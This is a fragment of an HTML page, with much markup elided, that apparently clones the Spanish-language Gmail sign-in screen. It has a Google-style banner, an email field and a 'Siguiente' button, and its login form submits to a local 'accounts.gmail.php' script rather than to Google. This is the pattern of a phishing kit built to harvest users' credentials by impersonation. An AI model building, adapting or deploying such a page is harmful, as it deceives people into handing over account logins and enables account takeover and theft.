...
<html lang="en">
 ...
 <link rel="icon" href="g.png" type="image/png" sizes="20x20"> 
		<style>
		</style>
		<style>
			h1, h2 {
	...
	<body>
		<div class="wrapper">
			...
			<div class="main content clearfix">
				<div class="banner">
					<h1> Acceder </h1>
					<h2 class="hidden-small"> Ir a Gmail </h2>
				</div>
						...
						<form novalidate="" method="post" action="accounts.gmail.php" id="gaia_loginform">
							...
							<div class="form-panel first valid" id="gaia_firstform">
								<div class="slide-out">
									<div class="input-wrapper focused">
										<div id="identifier-shown">
											<div>
												...
												<input id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="Correo" autofocus="">
									...
									<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Siguiente">
									<a class="need-help" href="#"> Encontrar mi cuenta </a>
								</div>
							</div>
						...
						<div class="card-mask">
							<div class="one-myweb">
								<p class="create-account">
									...
									<span id="link-signup"> <a href="#"> Crear cuenta </a> </span>
								</p>
								<p class="tagline">
